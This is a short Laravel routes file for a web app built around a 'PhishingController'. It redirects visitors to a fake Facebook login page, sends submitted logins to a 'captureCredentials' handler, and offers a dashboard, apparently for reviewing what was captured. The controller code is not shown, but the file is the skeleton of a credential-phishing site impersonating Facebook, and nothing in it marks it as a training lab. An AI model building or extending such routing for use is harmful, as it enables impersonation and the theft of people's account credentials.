<?php

use Illuminate\Support\Facades\Route;
use App\Http\Controllers\PhishingController;
use App\Http\Controllers\DashboardController;

// Redirect home
Route::get('/', function () {
    return redirect('/facebook-login');
});

// Facebook login page
Route::get('/facebook-login', [PhishingController::class, 'showLoginPage']);
Route::post('/facebook-login', [PhishingController::class, 'captureCredentials']);

// Dashboard
Route::get('/dashboard', [DashboardController::class, 'index']);